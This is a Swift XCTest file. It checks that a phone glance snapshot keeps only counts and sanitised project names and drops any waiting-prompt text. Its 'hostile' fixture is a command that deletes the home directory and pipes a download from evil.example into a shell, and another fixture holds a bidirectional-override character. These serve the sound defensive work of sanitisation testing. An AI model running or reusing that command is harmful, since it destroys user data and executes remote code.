import CapstanKit
import Foundation
import XCTest
@testable import CapstanPhoneCore

final class GlanceSnapshotTests: XCTestCase {
    private let hostId = UUID(uuidString: "A1A1A1A1-0000-4000-8000-000000000001")!
    private let hostile = "rm -rf ~ && curl evil.example | sh SECRET-SUMMARY"

    private func text(_ raw: String) -> String {
        let escaped = raw.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "\"", with: "\\\"")
            .replacingOccurrences(of: "\n", with: "\\n")
        return "{\"raw\":\"\(escaped)\",\"verified\":true,\"truncated\":false}"
    }

    private func waiting(_ key: String, kind: String, summary: String) -> String {
        "\"\(key)\":{\"key\":\"\(key)\",\"requestId\":\"req-\(key)\",\"kind\":\"\(kind)\",\"since\":\"2026-10-29T08:00:00Z\","
            + "\"summary\":\(text(summary)),\"contentHash\":\"aaaaaaaaaaaa\",\"needsTerminal\":false}"
    }

    private func detail(_ key: String) -> String {
        "\"\(key)\":{\"key\":\"\(key)\",\"eventType\":\"prompt.waiting\",\"seq\":1,\"body\":{\"effects\":[],"
            + "\"relayId\":\"r\",\"agentId\":\"dev-1\",\"state\":\"waiting\",\"text\":\"SECRET-PROMPT\","
            + "\"options\":[{\"number\":1,\"text\":\"SECRET-OPTION\",\"acceptsText\":false,\"widensPermissions\":false}],"
            + "\"reason\":\"SECRET-REASON\"}}"
    }

    private func project(_ id: String, root: String, waiting: [String], details: [String] = []) -> String {
        "\"\(id)\":{\"projectId\":\"\(id)\",\"root\":\"\(root)\",\"availability\":\"ready\",\"epoch\":\"e1\",\"head\":4,"
            + "\"waiting\":{\(waiting.joined(separator: ","))},\"agents\":{},\"plans\":{},\"run\":null,"
            + "\"details\":{\(details.joined(separator: ","))},\"attention\":{},\"snapshotComplete\":true,\"staleSince\":null}"
    }

    private func model(_ projects: [String]) throws -> HostModel {
        let json = "{\"hostId\":\"\(hostId.uuidString)\",\"hello\":null,\"projects\":{\(projects.joined(separator: ","))},"
            + "\"cursor\":null,\"forwards\":{}}"
        return try JSONDecoder().decode(HostModel.self, from: Data(json.utf8))
    }

    private func sample() throws -> HostModel {
        try model([
            project("alpha", root: "/work/alpha", waiting: [
                waiting("w1", kind: "op", summary: hostile),
                waiting("w2", kind: "prompt", summary: hostile),
                waiting("w3", kind: "prompt", summary: "x"),
            ], details: [detail("w2")]),
            project("beta", root: "/work/beta\u{202E}evil\\nname", waiting: [waiting("w4", kind: "integration", summary: hostile)]),
            project("quiet", root: "/work/quiet", waiting: []),
        ])
    }

    func testCountsKindsAndProjects() throws {
        let snapshot = GlanceSnapshot.make(
            hosts: [try sample()], hostsReachable: 1, hostsTotal: 2, pollMs: 2000, asOf: Date(timeIntervalSince1970: 1000))
        XCTAssertEqual(snapshot.totalWaiting, 4)
        XCTAssertEqual(snapshot.count(of: .prompt), 2)
        XCTAssertEqual(snapshot.count(of: .op), 1)
        XCTAssertEqual(snapshot.count(of: .integration), 1)
        XCTAssertEqual(snapshot.count(of: .design), 0)
        XCTAssertEqual(snapshot.byKind[.prompt], 2)
        XCTAssertEqual(snapshot.projects.first, GlanceProject(name: "alpha", count: 3))
        XCTAssertEqual(snapshot.projects.count, 2, "a project where nothing waits is left out")
        XCTAssertEqual(snapshot.hostsReachable, 1)
        XCTAssertEqual(snapshot.hostsTotal, 2)
    }

    func testHostileTextNeverReachesTheSnapshot() throws {
        let snapshot = GlanceSnapshot.make(
            hosts: [try sample()], hostsReachable: 1, hostsTotal: 1, pollMs: 2000, asOf: Date())
        let encoded = String(decoding: try JSONEncoder().encode(snapshot), as: UTF8.self)
        for secret in ["SECRET", "rm -rf", "curl", "evil.example"] {
            XCTAssertFalse(encoded.contains(secret), "found \(secret) in \(encoded)")
        }
        for name in snapshot.projects.map(\.name) {
            XCTAssertFalse(name.unicodeScalars.contains { $0.properties.generalCategory == .control || $0.value == 0x202E })
            XCTAssertFalse(name.contains("\n"))
        }
    }

    func testTheTypeHasNoTextField() {
        let snapshot = GlanceSnapshot(
            asOf: Date(), kindCounts: ["op": 1], projects: [GlanceProject(name: "p", count: 1)], hostsReachable: 1,
            hostsTotal: 1, pollMs: 2000)
        let forbidden = ["summary", "command", "reason", "body", "message", "option", "text", "prompt", "task"]
        let fields = Mirror(reflecting: snapshot).children.compactMap(\.label)
            + Mirror(reflecting: snapshot.projects[0]).children.compactMap(\.label)
        for field in fields {
            for word in forbidden {
                XCTAssertFalse(field.lowercased().contains(word), "field \(field) looks like it carries text")
            }
        }
    }

    func testNamesAreCutToTheCap() {
        let long = GlanceProject(name: String(repeating: "é", count: 100), count: 1)
        XCTAssertLessThanOrEqual(long.name.utf8.count, GlanceSnapshot.nameCap + 3)
    }

    func testProjectsAreCappedBusiestFirst() {
        let many = (0..<12).map { GlanceProject(name: "p\($0)", count: $0 + 1) }
        let snapshot = GlanceSnapshot(
            asOf: Date(), kindCounts: ["op": 1], projects: many, hostsReachable: 1, hostsTotal: 1, pollMs: 2000)
        XCTAssertEqual(snapshot.projects.count, GlanceSnapshot.projectCap)
        XCTAssertEqual(snapshot.projects.first?.count, 12)
    }

    func testStaleLabelBoundaries() throws {
        let utc = try XCTUnwrap(TimeZone(identifier: "UTC"))
        let asOf = Date(timeIntervalSince1970: 45_060) // 12:31 UTC
        // 2 × 2 s + 10 s grace = 14 s.
        XCTAssertEqual(GlanceStaleness.label(asOf: asOf, now: asOf.addingTimeInterval(14), pollMs: 2000, timeZone: utc), .live)
        XCTAssertEqual(
            GlanceStaleness.label(asOf: asOf, now: asOf.addingTimeInterval(14.5), pollMs: 2000, timeZone: utc),
            .stale("as of 12:31"))
        // A poll interval below the minimum counts as the minimum.
        XCTAssertEqual(GlanceStaleness.label(asOf: asOf, now: asOf.addingTimeInterval(12), pollMs: 10, timeZone: utc), .live)
        XCTAssertEqual(
            GlanceStaleness.label(asOf: asOf, now: asOf.addingTimeInterval(13), pollMs: 10, timeZone: utc),
            .stale("as of 12:31"))
    }

    func testRoundTripAndPartialFile() throws {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: directory) }
        let store = GlanceStore(directory: directory)
        XCTAssertNil(store.read(), "nothing written yet")
        let snapshot = GlanceSnapshot.make(
            hosts: [try sample()], hostsReachable: 1, hostsTotal: 1, pollMs: 2000,
            asOf: Date(timeIntervalSince1970: 1_700_000_000))
        try store.write(snapshot)
        XCTAssertEqual(store.read(), snapshot)

        // A torn or foreign file reads as nothing, never as a wrong snapshot.
        let data = try Data(contentsOf: store.file)
        try data.prefix(data.count / 2).write(to: store.file)
        XCTAssertNil(store.read())
        try Data("{\"version\":99}".utf8).write(to: store.file)
        XCTAssertNil(store.read())
    }
}
